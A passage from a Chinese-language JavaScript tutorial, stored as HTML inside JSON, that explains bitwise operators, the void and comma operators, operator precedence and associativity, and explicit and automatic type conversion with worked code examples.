~Number([])\n~[] // -1\n\n// 相当于 ~Number(NaN)\n~NaN // -1\n\n// 相当于 ~Number(null)\n~null // -1</code></pre>\n        <h2>\n            <a href='#异或运算符' class='header-anchor'>#</a>\n            <span>异或运算符</span>\n        </h2>\n    <p>异或运算（<code>^</code>）在两个二进制位不同时返回<code>1</code>，相同时返回<code>0</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>0 ^ 3 // 3</code></pre><p>上面表达式中，<code>0</code>（二进制<code>00</code>）与<code>3</code>（二进制<code>11</code>）进行异或运算，它们每一个二进制位都不同，所以得到<code>11</code>（即<code>3</code>）。</p>\n<p>“异或运算”有一个特殊运用，连续对两个数<code>a</code>和<code>b</code>进行三次异或运算，<code>a^=b; b^=a; a^=b;</code>，可以<a href=\"http://en.wikipedia.org/wiki/XOR_swap_algorithm\">互换</a>它们的值。这意味着，使用“异或运算”可以在不引入临时变量的前提下，互换两个变量的值。</p>\n<pre class=\"prettyprint language-javascript\"><code>var a = 10;\nvar b = 99;\n\na ^= b, b ^= a, a ^= b;\n\na // 99\nb // 10</code></pre><p>这是互换两个变量的值的最快方法。</p>\n<p>异或运算也可以用来取整。</p>\n<pre class=\"prettyprint language-javascript\"><code>12.9 ^ 0 // 12</code></pre>\n        <h2>\n            <a href='#左移运算符' class='header-anchor'>#</a>\n            <span>左移运算符</span>\n        </h2>\n    <p>左移运算符（<code>&lt;&lt;</code>）表示将一个数的二进制值向左移动指定的位数，尾部补<code>0</code>，即乘以<code>2</code>的指定次方。</p>\n<pre class=\"prettyprint language-javascript\"><code>// 4 的二进制形式为100，\n// 左移一位为1000（即十进制的8）\n// 相当于乘以2的1次方\n4 &lt;&lt; 1\n// 8\n\n-4 &lt;&lt; 1\n// -8</code></pre><p>上面代码中，<code>-4</code>左移一位得到<code>-8</code>，是因为<code>-4</code>的二进制形式是<code>11111111111111111111111111111100</code>，左移一位后得到<code>11111111111111111111111111111000</code>，该数转为十进制（减去1后取反，再加上负号）即为<code>-8</code>。</p>\n<p>如果左移0位，就相当于将该数值转为32位整数，等同于取整，对于正数和负数都有效。</p>\n<pre class=\"prettyprint language-javascript\"><code>13.5 &lt;&lt; 0\n// 13\n\n-13.5 &lt;&lt; 0\n// -13</code></pre><p>左移运算符用于二进制数值非常方便。</p>\n<pre class=\"prettyprint language-javascript\"><code>var color = {r: 186, g: 218, b: 85};\n\n// RGB to HEX\n// (1 &lt;&lt; 24)的作用为保证结果是6位数\nvar rgb2hex = function(r, g, b) {\n  return &#039;#&#039; + ((1 &lt;&lt; 24) + (r &lt;&lt; 16) + (g &lt;&lt; 8) + b)\n    .toString(16) // 先转成十六进制，然后返回字符串\n    .substr(1);   // 去除字符串的最高位，返回后面六个字符串\n}\n\nrgb2hex(color.r, color.g, color.b)\n// &quot;#bada55&quot;</code></pre><p>上面代码使用左移运算符，将颜色的 RGB 值转为 HEX 值。</p>\n\n        <h2>\n            <a href='#右移运算符' class='header-anchor'>#</a>\n            <span>右移运算符</span>\n        </h2>\n    <p>右移运算符（<code>&gt;&gt;</code>）表示将一个数的二进制值向右移动指定的位数，头部补<code>0</code>，即除以<code>2</code>的指定次方（最高位即符号位不参与移动）。</p>\n<pre class=\"prettyprint language-javascript\"><code>4 &gt;&gt; 1\n// 2\n/*\n// 因为4的二进制形式为 00000000000000000000000000000100，\n// 右移一位得到 00000000000000000000000000000010，\n// 即为十进制的2\n*/\n\n-4 &gt;&gt; 1\n// -2\n/*\n// 因为-4的二进制形式为 11111111111111111111111111111100，\n// 右移一位，头部补1，得到 11111111111111111111111111111110,\n// 即为十进制的-2\n*/</code></pre><p>右移运算可以模拟 2 的整除运算。</p>\n<pre class=\"prettyprint language-javascript\"><code>5 &gt;&gt; 1\n// 2\n// 相当于 5 / 2 = 2\n\n21 &gt;&gt; 2\n// 5\n// 相当于 21 / 4 = 5\n\n21 &gt;&gt; 3\n// 2\n// 相当于 21 / 8 = 2\n\n21 &gt;&gt; 4\n// 1\n// 相当于 21 / 16 = 1</code></pre>\n        <h2>\n            <a href='#带符号位的右移运算符' class='header-anchor'>#</a>\n            <span>带符号位的右移运算符</span>\n        </h2>\n    <p>带符号位的右移运算符（<code>&gt;&gt;&gt;</code>）表示将一个数的二进制形式向右移动，包括符号位也参与移动，头部补<code>0</code>。所以，该运算总是得到正值。对于正数，该运算的结果与右移运算符（<code>&gt;&gt;</code>）完全一致，区别主要在于负数。</p>\n<pre class=\"prettyprint language-javascript\"><code>4 &gt;&gt;&gt; 1\n// 2\n\n-4 &gt;&gt;&gt; 1\n// 2147483646\n/*\n// 因为-4的二进制形式为11111111111111111111111111111100，\n// 带符号位的右移一位，得到01111111111111111111111111111110，\n// 即为十进制的2147483646。\n*/</code></pre><p>这个运算实际上将一个值转为32位无符号整数。</p>\n<p>查看一个负整数在计算机内部的储存形式，最快的方法就是使用这个运算符。</p>\n<pre class=\"prettyprint language-javascript\"><code>-1 &gt;&gt;&gt; 0 // 4294967295</code></pre><p>上面代码表示，<code>-1</code>作为32位整数时，内部的储存形式使用无符号整数格式解读，值为 4294967295（即<code>(2^32)-1</code>，等于<code>11111111111111111111111111111111</code>）。</p>\n\n        <h2>\n            <a href='#开关作用' class='header-anchor'>#</a>\n            <span>开关作用</span>\n        </h2>\n    <p>位运算符可以用作设置对象属性的开关。</p>\n<p>假定某个对象有四个开关，每个开关都是一个变量。那么，可以设置一个四位的二进制数，它的每个位对应一个开关。</p>\n<pre class=\"prettyprint language-javascript\"><code>var FLAG_A = 1; // 0001\nvar FLAG_B = 2; // 0010\nvar FLAG_C = 4; // 0100\nvar FLAG_D = 8; // 1000</code></pre><p>上面代码设置 A、B、C、D 四个开关，每个开关分别占有一个二进制位。</p>\n<p>然后，就可以用二进制与运算检验，当前设置是否打开了指定开关。</p>\n<pre class=\"prettyprint language-javascript\"><code>var flags = 5; // 二进制的0101\n\nif (flags &amp; FLAG_C) {\n  // ...\n}\n// 0101 &amp; 0100 =&gt; 0100 =&gt; true</code></pre><p>上面代码检验是否打开了开关<code>C</code>。如果打开，会返回<code>true</code>，否则返回<code>false</code>。</p>\n<p>现在假设需要打开<code>A</code>、<code>B</code>、<code>D</code>三个开关，我们可以构造一个掩码变量。</p>\n<pre class=\"prettyprint language-javascript\"><code>var mask = FLAG_A | FLAG_B | FLAG_D;\n// 0001 | 0010 | 1000 =&gt; 1011</code></pre><p>上面代码对<code>A</code>、<code>B</code>、<code>D</code>三个变量进行二进制或运算，得到掩码值为二进制的<code>1011</code>。</p>\n<p>有了掩码，二进制或运算可以确保打开指定的开关。</p>\n<pre class=\"prettyprint language-javascript\"><code>flags = flags | mask;</code></pre><p>二进制与运算可以将当前设置中凡是与开关设置不一样的项，全部关闭。</p>\n<pre class=\"prettyprint language-javascript\"><code>flags = flags &amp; mask;</code></pre><p>异或运算可以切换（toggle）当前设置，即第一次执行可以得到当前设置的相反值，再执行一次又得到原来的值。</p>\n<pre class=\"prettyprint language-javascript\"><code>flags = flags ^ mask;</code></pre><p>二进制否运算可以翻转当前设置，即原设置为<code>0</code>，运算后变为<code>1</code>；原设置为<code>1</code>，运算后变为<code>0</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>flags = ~flags;</code></pre>\n        <h2>\n            <a href='#参考链接' class='header-anchor'>#</a>\n            <span>参考链接</span>\n        </h2>\n    <ul>\n<li>Michal Budzynski, <a href=\"http://michalbe.blogspot.co.uk/2013/03/javascript-less-known-parts-bitwise.html\">JavaScript: The less known parts. Bitwise Operators</a></li>\n<li>Axel Rauschmayer, <a href=\"http://www.2ality.com/2013/06/basic-javascript.html\">Basic JavaScript for the impatient programmer</a></li>\n<li>Mozilla Developer Network, <a href=\"https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/Bitwise_Operators\">Bitwise Operators</a></li>\n</ul>\n"},{"context":[{"title":"教程","link":"javascript:void(0)"},{"title":"运算符","link":"javascript:void(0)"},{"title":"其他运算符，运算顺序","link":"/operators/priority.html"}],"content":"\n        <h1>\n            <a href='#其他运算符，运算顺序' class='header-anchor'>#</a>\n            <span>其他运算符，运算顺序</span>\n        </h1>\n    \n        <h2>\n            <a href='#void-运算符' class='header-anchor'>#</a>\n            <span>void 运算符</span>\n        </h2>\n    <p><code>void</code>运算符的作用是执行一个表达式，然后不返回任何值，或者说返回<code>undefined</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>void 0 // undefined\nvoid(0) // undefined</code></pre><p>上面是<code>void</code>运算符的两种写法，都正确。建议采用后一种形式，即总是使用圆括号。因为<code>void</code>运算符的优先性很高，如果不使用括号，容易造成错误的结果。比如，<code>void 4 + 7</code>实际上等同于<code>(void 4) + 7</code>。</p>\n<p>下面是<code>void</code>运算符的一个例子。</p>\n<pre class=\"prettyprint language-javascript\"><code>var x = 3;\nvoid (x = 5) //undefined\nx // 5</code></pre><p>这个运算符的主要用途是浏览器的书签工具（bookmarklet），以及在超级链接中插入代码防止网页跳转。</p>\n<p>请看下面的代码。</p>\n<pre class=\"prettyprint language-html\"><code>&lt;script&gt;\nfunction f() {\n  console.log(&#039;Hello World&#039;);\n}\n&lt;/script&gt;\n&lt;a href=&quot;http://example.com&quot; onclick=&quot;f(); return false;&quot;&gt;点击&lt;/a&gt;</code></pre><p>上面代码中，点击链接后，会先执行<code>onclick</code>的代码，由于<code>onclick</code>返回<code>false</code>，所以浏览器不会跳转到 example.com。</p>\n<p><code>void</code>运算符可以取代上面的写法。</p>\n<pre class=\"prettyprint language-html\"><code>&lt;a href=&quot;javascript: void(f())&quot;&gt;文字&lt;/a&gt;</code></pre><p>下面是一个更实际的例子，用户点击链接提交表单，但是不产生页面跳转。</p>\n<pre class=\"prettyprint language-html\"><code>&lt;a href=&quot;javascript: void(document.form.submit())&quot;&gt;\n  提交\n&lt;/a&gt;</code></pre>\n        <h2>\n            <a href='#逗号运算符' class='header-anchor'>#</a>\n            <span>逗号运算符</span>\n        </h2>\n    <p>逗号运算符用于对两个表达式求值，并返回后一个表达式的值。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;a&#039;, &#039;b&#039; // &quot;b&quot;\n\nvar x = 0;\nvar y = (x++, 10);\nx // 1\ny // 10</code></pre><p>上面代码中，逗号运算符返回后一个表达式的值。</p>\n<p>逗号运算符的一个用途是，在返回一个值之前，进行一些辅助操作。</p>\n<pre class=\"prettyprint language-javascript\"><code>var value = (console.log(&#039;Hi!&#039;), true);\n// Hi!\n\nvalue // true</code></pre><p>上面代码中，先执行逗号之前的操作，然后返回逗号后面的值。</p>\n\n        <h2>\n            <a href='#运算顺序' class='header-anchor'>#</a>\n            <span>运算顺序</span>\n        </h2>\n    \n        <h3>\n            <a href='#优先级' class='header-anchor'>#</a>\n            <span>优先级</span>\n        </h3>\n    <p>JavaScript 各种运算符的优先级别（Operator Precedence）是不一样的。优先级高的运算符先执行，优先级低的运算符后执行。</p>\n<pre class=\"prettyprint language-javascript\"><code>4 + 5 * 6 // 34</code></pre><p>上面的代码中，乘法运算符（<code>*</code>）的优先性高于加法运算符（<code>+</code>），所以先执行乘法，再执行加法，相当于下面这样。</p>\n<pre class=\"prettyprint language-javascript\"><code>4 + (5 * 6) // 34</code></pre><p>如果多个运算符混写在一起，常常会导致令人困惑的代码。</p>\n<pre class=\"prettyprint language-javascript\"><code>var x = 1;\nvar arr = [];\n\nvar y = arr.length &lt;= 0 || arr[0] === undefined ? x : arr[0];</code></pre><p>上面代码中，变量<code>y</code>的值就很难看出来，因为这个表达式涉及5个运算符，到底谁的优先级最高，实在不容易记住。</p>\n<p>根据语言规格，这五个运算符的优先级从高到低依次为：小于等于（<code>&lt;=</code>)、严格相等（<code>===</code>）、或（<code>||</code>）、三元（<code>?:</code>）、等号（<code>=</code>）。因此上面的表达式，实际的运算顺序如下。</p>\n<pre class=\"prettyprint language-javascript\"><code>var y = ((arr.length &lt;= 0) || (arr[0] === undefined)) ? x : arr[0];</code></pre><p>记住所有运算符的优先级，是非常难的，也是没有必要的。</p>\n\n        <h3>\n            <a href='#圆括号的作用' class='header-anchor'>#</a>\n            <span>圆括号的作用</span>\n        </h3>\n    <p>圆括号（<code>()</code>）可以用来提高运算的优先级，因为它的优先级是最高的，即圆括号中的表达式会第一个运算。</p>\n<pre class=\"prettyprint language-javascript\"><code>(4 + 5) * 6 // 54</code></pre><p>上面代码中，由于使用了圆括号，加法会先于乘法执行。</p>\n<p>运算符的优先级别十分繁杂，且都是硬性规定，因此建议总是使用圆括号，保证运算顺序清晰可读，这对代码的维护和除错至关重要。</p>\n<p>顺便说一下，圆括号不是运算符，而是一种语法结构。它一共有两种用法：一种是把表达式放在圆括号之中，提升运算的优先级；另一种是跟在函数的后面，作用是调用函数。</p>\n<p>注意，因为圆括号不是运算符，所以不具有求值作用，只改变运算的优先级。</p>\n<pre class=\"prettyprint language-javascript\"><code>var x = 1;\n(x) = 2;</code></pre><p>上面代码的第二行，如果圆括号具有求值作用，那么就会变成<code>1 = 2</code>，这是会报错了。但是，上面的代码可以运行，这验证了圆括号只改变优先级，不会求值。</p>\n<p>这也意味着，如果整个表达式都放在圆括号之中，那么不会有任何效果。</p>\n<pre class=\"prettyprint language-javascript\"><code>(exprssion)\n// 等同于\nexpression</code></pre><p>函数放在圆括号中，会返回函数本身。如果圆括号紧跟在函数的后面，就表示调用函数。</p>\n<pre class=\"prettyprint language-javascript\"><code>function f() {\n  return 1;\n}\n\n(f) // function f(){return 1;}\nf() // 1</code></pre><p>上面代码中，函数放在圆括号之中会返回函数本身，圆括号跟在函数后面则是调用函数。</p>\n<p>圆括号之中，只能放置表达式，如果将语句放在圆括号之中，就会报错。</p>\n<pre class=\"prettyprint language-javascript\"><code>(var a = 1)\n// SyntaxError: Unexpected token var</code></pre>\n        <h3>\n            <a href='#左结合与右结合' class='header-anchor'>#</a>\n            <span>左结合与右结合</span>\n        </h3>\n    <p>对于优先级别相同的运算符，大多数情况，计算顺序总是从左到右，这叫做运算符的“左结合”（left-to-right associativity），即从左边开始计算。</p>\n<pre class=\"prettyprint language-javascript\"><code>x + y + z</code></pre><p>上面代码先计算最左边的<code>x</code>与<code>y</code>的和，然后再计算与<code>z</code>的和。</p>\n<p>但是少数运算符的计算顺序是从右到左，即从右边开始计算，这叫做运算符的“右结合”（right-to-left associativity）。其中，最主要的是赋值运算符（<code>=</code>）和三元条件运算符（<code>?:</code>）。</p>\n<pre class=\"prettyprint language-javascript\"><code>w = x = y = z;\nq = a ? b : c ? d : e ? f : g;</code></pre><p>上面代码的运算结果，相当于下面的样子。</p>\n<pre class=\"prettyprint language-javascript\"><code>w = (x = (y = z));\nq = a ? b : (c ? d : (e ? f : g));</code></pre><p>上面的两行代码，各有三个等号运算符和三个三元运算符，都是先计算最右边的那个运算符。</p>\n"},{"context":[{"title":"教程","link":"javascript:void(0)"},{"title":"语法专题","link":"javascript:void(0)"},{"title":"数据类型的转换","link":"/features/conversion.html"}],"content":"\n        <h1>\n            <a href='#数据类型的转换' class='header-anchor'>#</a>\n            <span>数据类型的转换</span>\n        </h1>\n    \n        <h2>\n            <a href='#概述' class='header-anchor'>#</a>\n            <span>概述</span>\n        </h2>\n    <p>JavaScript 是一种动态类型语言，变量没有类型限制，可以随时赋予任意值。</p>\n<pre class=\"prettyprint language-javascript\"><code>var x = y ? 1 : &#039;a&#039;;</code></pre><p>上面代码中，变量<code>x</code>到底是数值还是字符串，取决于另一个变量<code>y</code>的值。<code>y</code>为<code>true</code>时，<code>x</code>是一个数值；<code>y</code>为<code>false</code>时，<code>x</code>是一个字符串。这意味着，<code>x</code>的类型没法在编译阶段就知道，必须等到运行时才能知道。</p>\n<p>虽然变量的数据类型是不确定的，但是各种运算符对数据类型是有要求的。如果运算符发现，运算子的类型与预期不符，就会自动转换类型。比如，减法运算符预期左右两侧的运算子应该是数值，如果不是，就会自动将它们转为数值。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;4&#039; - &#039;3&#039; // 1</code></pre><p>上面代码中，虽然是两个字符串相减，但是依然会得到结果数值<code>1</code>，原因就在于 JavaScript 将运算子自动转为了数值。</p>\n<p>本章讲解数据类型自动转换的规则。在此之前，先讲解如何手动强制转换数据类型。</p>\n\n        <h2>\n            <a href='#强制转换' class='header-anchor'>#</a>\n            <span>强制转换</span>\n        </h2>\n    <p>强制转换主要指使用<code>Number()</code>、<code>String()</code>和<code>Boolean()</code>三个函数，手动将各种类型的值，分别转换成数字、字符串或者布尔值。</p>\n\n        <h3>\n            <a href='#Number()' class='header-anchor'>#</a>\n            <span>Number()</span>\n        </h3>\n    <p>使用<code>Number</code>函数，可以将任意类型的值转化成数值。</p>\n<p>下面分成两种情况讨论，一种是参数是原始类型的值，另一种是参数是对象。</p>\n<p><strong>（1）原始类型值</strong></p>\n<p>原始类型值的转换规则如下。</p>\n<pre class=\"prettyprint language-javascript\"><code>// 数值：转换后还是原来的值\nNumber(324) // 324\n\n// 字符串：如果可以被解析为数值，则转换为相应的数值\nNumber(&#039;324&#039;) // 324\n\n// 字符串：如果不可以被解析为数值，返回 NaN\nNumber(&#039;324abc&#039;) // NaN\n\n// 空字符串转为0\nNumber(&#039;&#039;) // 0\n\n// 布尔值：true 转成 1，false 转成 0\nNumber(true) // 1\nNumber(false) // 0\n\n// undefined：转成 NaN\nNumber(undefined) // NaN\n\n// null：转成0\nNumber(null) // 0</code></pre><p><code>Number</code>函数将字符串转为数值，要比<code>parseInt</code>函数严格很多。基本上，只要有一个字符无法转成数值，整个字符串就会被转为<code>NaN</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>parseInt(&#039;42 cats&#039;) // 42\nNumber(&#039;42 cats&#039;) // NaN</code></pre><p>上面代码中，<code>parseInt</code>逐个解析字符，而<code>Number</code>函数整体转换字符串的类型。</p>\n<p>另外，<code>parseInt</code>和<code>Number</code>函数都会自动过滤一个字符串前导和后缀的空格。</p>\n<pre class=\"prettyprint language-javascript\"><code>parseInt(&#039;\\t\\v\\r12.34\\n&#039;) // 12\nNumber(&#039;\\t\\v\\r12.34\\n&#039;) // 12.34</code></pre><p><strong>（2）对象</strong></p>\n<p>简单的规则是，<code>Number</code>方法的参数是对象时，将返回<code>NaN</code>，除非是包含单个数值的数组。</p>\n<pre class=\"prettyprint language-javascript\"><code>Number({a: 1}) // NaN\nNumber([1, 2, 3]) // NaN\nNumber([5]) // 5</code></pre><p>之所以会这样，是因为<code>Number</code>背后的转换规则比较复杂。</p>\n<p>第一步，调用对象自身的<code>valueOf</code>方法。如果返回原始类型的值，则直接对该值使用<code>Number</code>函数，不再进行后续步骤。</p>\n<p>第二步，如果<code>valueOf</code>方法返回的还是对象，则改为调用对象自身的<code>toString</code>方法。如果<code>toString</code>方法返回原始类型的值，则对该值使用<code>Number</code>函数，不再进行后续步骤。</p>\n<p>第三步，如果<code>toString</code>方法返回的是对象，就报错。</p>\n<p>请看下面的例子。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = {x: 1};\nNumber(obj) // NaN\n\n// 等同于\nif (typeof obj.valueOf() === &#039;object&#039;) {\n  Number(obj.toString());\n} else {\n  Number(obj.valueOf());\n}</code></pre><p>上面代码中，<code>Number</code>函数将<code>obj</code>对象转为数值。背后发生了一连串的操作，首先调用<code>obj.valueOf</code>方法, 结果返回对象本身；于是，继续调用<code>obj.toString</code>方法，这时返回字符串<code>[object Object]</code>，对这个字符串使用<code>Number</code>函数，得到<code>NaN</code>。</p>\n<p>默认情况下，对象的<code>valueOf</code>方法返回对象本身，所以一般总是会调用<code>toString</code>方法，而<code>toString</code>方法返回对象的类型字符串（比如<code>[object Object]</code>）。所以，会有下面的结果。</p>\n<pre class=\"prettyprint language-javascript\"><code>Number({}) // NaN</code></pre><p>如果<code>toString</code>方法返回的不是原始类型的值，结果就会报错。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = {\n  valueOf: function () {\n    return {};\n  },\n  toString: function () {\n    return {};\n  }\n};\n\nNumber(obj)\n// TypeError: Cannot convert object to primitive value</code></pre><p>上面代码的<code>valueOf</code>和<code>toString</code>方法，返回的都是对象，所以转成数值时会报错。</p>\n<p>从上例还可以看到，<code>valueOf</code>和<code>toString</code>方法，都是可以自定义的。</p>\n<pre class=\"prettyprint language-javascript\"><code>Number({\n  valueOf: function () {\n    return 2;\n  }\n})\n// 2\n\nNumber({\n  toString: function () {\n    return 3;\n  }\n})\n// 3\n\nNumber({\n  valueOf: function () {\n    return 2;\n  },\n  toString: function () {\n    return 3;\n  }\n})\n// 2</code></pre><p>上面代码对三个对象使用<code>Number</code>函数。第一个对象返回<code>valueOf</code>方法的值，第二个对象返回<code>toString</code>方法的值，第三个对象表示<code>valueOf</code>方法先于<code>toString</code>方法执行。</p>\n\n        <h3>\n            <a href='#String()' class='header-anchor'>#</a>\n            <span>String()</span>\n        </h3>\n    <p><code>String</code>函数可以将任意类型的值转化成字符串，转换规则如下。</p>\n<p><strong>（1）原始类型值</strong></p>\n<ul>\n<li><strong>数值</strong>：转为相应的字符串。</li>\n<li><strong>字符串</strong>：转换后还是原来的值。</li>\n<li><strong>布尔值</strong>：<code>true</code>转为字符串<code>&quot;true&quot;</code>，<code>false</code>转为字符串<code>&quot;false&quot;</code>。</li>\n<li><strong>undefined</strong>：转为字符串<code>&quot;undefined&quot;</code>。</li>\n<li><strong>null</strong>：转为字符串<code>&quot;null&quot;</code>。</li>\n</ul>\n<pre class=\"prettyprint language-javascript\"><code>String(123) // &quot;123&quot;\nString(&#039;abc&#039;) // &quot;abc&quot;\nString(true) // &quot;true&quot;\nString(undefined) // &quot;undefined&quot;\nString(null) // &quot;null&quot;</code></pre><p><strong>（2）对象</strong></p>\n<p><code>String</code>方法的参数如果是对象，返回一个类型字符串；如果是数组，返回该数组的字符串形式。</p>\n<pre class=\"prettyprint language-javascript\"><code>String({a: 1}) // &quot;[object Object]&quot;\nString([1, 2, 3]) // &quot;1,2,3&quot;</code></pre><p><code>String</code>方法背后的转换规则，与<code>Number</code>方法基本相同，只是互换了<code>valueOf</code>方法和<code>toString</code>方法的执行顺序。</p>\n<ol>\n<li><p>先调用对象自身的<code>toString</code>方法。如果返回原始类型的值，则对该值使用<code>String</code>函数，不再进行以下步骤。</p>\n</li>\n<li><p>如果<code>toString</code>方法返回的是对象，再调用原对象的<code>valueOf</code>方法。如果<code>valueOf</code>方法返回原始类型的值，则对该值使用<code>String</code>函数，不再进行以下步骤。</p>\n</li>\n<li><p>如果<code>valueOf</code>方法返回的是对象，就报错。</p>\n</li>\n</ol>\n<p>下面是一个例子。</p>\n<pre class=\"prettyprint language-javascript\"><code>String({a: 1})\n// &quot;[object Object]&quot;\n\n// 等同于\nString({a: 1}.toString())\n// &quot;[object Object]&quot;</code></pre><p>上面代码先调用对象的<code>toString</code>方法，发现返回的是字符串<code>[object Object]</code>，就不再调用<code>valueOf</code>方法了。</p>\n<p>如果<code>toString</code>法和<code>valueOf</code>方法，返回的都是对象，就会报错。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = {\n  valueOf: function () {\n    return {};\n  },\n  toString: function () {\n    return {};\n  }\n};\n\nString(obj)\n// TypeError: Cannot convert object to primitive value</code></pre><p>下面是通过自定义<code>toString</code>方法，改变返回值的例子。</p>\n<pre class=\"prettyprint language-javascript\"><code>String({\n  toString: function () {\n    return 3;\n  }\n})\n// &quot;3&quot;\n\nString({\n  valueOf: function () {\n    return 2;\n  }\n})\n// &quot;[object Object]&quot;\n\nString({\n  valueOf: function () {\n    return 2;\n  },\n  toString: function () {\n    return 3;\n  }\n})\n// &quot;3&quot;</code></pre><p>上面代码对三个对象使用<code>String</code>函数。第一个对象返回<code>toString</code>方法的值（数值3），第二个对象返回的还是<code>toString</code>方法的值（<code>[object Object]</code>），第三个对象表示<code>toString</code>方法先于<code>valueOf</code>方法执行。</p>\n\n        <h3>\n            <a href='#Boolean()' class='header-anchor'>#</a>\n            <span>Boolean()</span>\n        </h3>\n    <p><code>Boolean</code>函数可以将任意类型的值转为布尔值。</p>\n<p>它的转换规则相对简单：除了以下五个值的转换结果为<code>false</code>，其他的值全部为<code>true</code>。</p>\n<ul>\n<li><code>undefined</code></li>\n<li><code>null</code></li>\n<li><code>-0</code>或<code>+0</code></li>\n<li><code>NaN</code></li>\n<li><code>&#39;&#39;</code>（空字符串）</li>\n</ul>\n<pre class=\"prettyprint language-javascript\"><code>Boolean(undefined) // false\nBoolean(null) // false\nBoolean(0) // false\nBoolean(NaN) // false\nBoolean(&#039;&#039;) // false</code></pre><p>注意，所有对象（包括空对象）的转换结果都是<code>true</code>，甚至连<code>false</code>对应的布尔对象<code>new Boolean(false)</code>也是<code>true</code>（详见《原始类型值的包装对象》一章）。</p>\n<pre class=\"prettyprint language-javascript\"><code>Boolean({}) // true\nBoolean([]) // true\nBoolean(new Boolean(false)) // true</code></pre><p>所有对象的布尔值都是<code>true</code>，这是因为 JavaScript 语言设计的时候，出于性能的考虑，如果对象需要计算才能得到布尔值，对于<code>obj1 &amp;&amp; obj2</code>这样的场景，可能会需要较多的计算。为了保证性能，就统一规定，对象的布尔值为<code>true</code>。</p>\n\n        <h2>\n            <a href='#自动转换' class='header-anchor'>#</a>\n            <span>自动转换</span>\n        </h2>\n    <p>下面介绍自动转换，它是以强制转换为基础的。</p>\n<p>遇到以下三种情况时，JavaScript 会自动转换数据类型，即转换是自动完成的，用户不可见。</p>\n<p>第一种情况，不同类型的数据互相运算。</p>\n<pre class=\"prettyprint language-javascript\"><code>123 + &#039;abc&#039; // &quot;123abc&quot;</code></pre><p>第二种情况，对非布尔值类型的数据求布尔值。</p>\n<pre class=\"prettyprint language-javascript\"><code>if (&#039;abc&#039;) {\n  console.log(&#039;hello&#039;)\n}  // &quot;hello&quot;</code></pre><p>第三种情况，对非数值类型的值使用一元运算符（即<code>+</code>和<code>-</code>）。</p>\n<pre class=\"prettyprint language-javascript\"><code>+ {foo: &#039;bar&#039;} // NaN\n- [1, 2, 3] // NaN</code></pre><p>自动转换的规则是这样的：预期什么类型的值，就调用该类型的转换函数。比如，某个位置预期为字符串，就调用<code>String</code>函数进行转换。如果该位置即可以是字符串，也可能是数值，那么默认转为数值。</p>\n<p>由于自动转换具有不确定性，而且不易除错，建议在预期为布尔值、数值、字符串的地方，全部使用<code>Boolean</code>、<code>Number</code>和<code>String</code>函数进行显式转换。</p>\n\n        <h3>\n            <a href='#自动转换为布尔值' class='header-anchor'>#</a>\n            <span>自动转换为布尔值</span>\n        </h3>\n    <p>JavaScript 遇到预期为布尔值的地方（比如<code>if</code>语句的条件部分），就会将非布尔值的参数自动转换为布尔值。系统内部会自动调用<code>Boolean</code>函数。</p>\n<p>因此除了以下五个值，其他都是自动转为<code>true</code>。</p>\n<ul>\n<li><code>undefined</code></li>\n<li><code>null</code></li>\n<li><code>+0</code>或<code>-0</code></li>\n<li><code>NaN</code></li>\n<li><code>&#39;&#39;</code>（空字符串）</li>\n</ul>\n<p>下面这个例子中，条件部分的每个值都相当于<code>false</code>，使用否定运算符后，就变成了<code>true</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>if ( !undefined\n  &amp;&amp; !null\n  &amp;&amp; !0\n  &amp;&amp; !NaN\n  &amp;&amp; !&#039;&#039;\n) {\n  console.log(&#039;true&#039;);\n} // true</code></pre><p>下面两种写法，有时也用于将一个表达式转为布尔值。它们内部调用的也是<code>Boolean</code>函数。</p>\n<pre class=\"prettyprint language-javascript\"><code>// 写法一\nexpression ? true : false\n\n// 写法二\n!! expression</code></pre>\n        <h3>\n            <a href='#自动转换为字符串' class='header-anchor'>#</a>\n            <span>自动转换为字符串</span>\n        </h3>\n    <p>JavaScript 遇到预期为字符串的地方，就会将非字符串的值自动转为字符串。具体规则是，先将复合类型的值转为原始类型的值，再将原始类型的值转为字符串。</p>\n<p>字符串的自动转换，主要发生在字符串的加法运算时。当一个值为字符串，另一个值为非字符串，则后者转为字符串。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;5&#039; + 1 // &#039;51&#039;\n&#039;5&#039; + true // &quot;5true&quot;\n&#039;5&#039; + false // &quot;5false&quot;\n&#039;5&#039; + {} // &quot;5[object Object]&quot;\n&#039;5&#039; + [] // &quot;5&quot;\n&#039;5&#039; + function (){} // &quot;5function (){}&quot;\n&#039;5&#039; + undefined // &quot;5undefined&quot;\n&#039;5&#039; + null // &quot;5null&quot;</code></pre><p>这种自动转换很容易出错。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = {\n  width: &#039;100&#039;\n};\n\nobj.width + 20 // &quot;10020&quot;</code></pre><p>上面代码中，开发者可能期望返回<code>120</code>，但是由于自动转换，实际上返回了一个字符<code>10020</code>。</p>\n\n        <h3>\n            <a href='#自动转换为数值' class='header-anchor'>#</a>\n            <span>自动转换为数值</span>\n        </h3>\n    <p>JavaScript 遇到预期为数值的地方，就会将参数值自动转换为数值。系统内部会自动调用<code>Number</code>函数。</p>\n<p>除了加法运算符（<code>+</code>）有可能把运算子转为字符串，其他运算符都会把运算子自动转成数值。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;5&#039; - &#039;2&#039; // 3\n&#039;5&#039; * &#039;2&#039; // 10\ntrue - 1  // 0\nfalse - 1 // -1\n&#039;1&#039; - 1   // 0\n&#039;5&#039; * []    // 0\nfalse / &#039;5&#039; // 0\n&#039;abc&#039; - 1   // NaN\nnull + 1 // 1\nundefined + 1 // NaN</code></pre><p>上面代码中，运算符两侧的运算子，都被转成了数值。</p>\n<blockquote>\n<p>注意：<code>null</code>转为数值时为<code>0</code>，而<code>undefined</code>转为数值时为<code>NaN</code>。</p>\n</blockquote>\n<p>一元运算符也会把运算子转成数值。</p>\n<pre class=\"prettyprint language-javascript\"><code>+&#039;abc&#039; // NaN\n-&#039;abc&#039; // 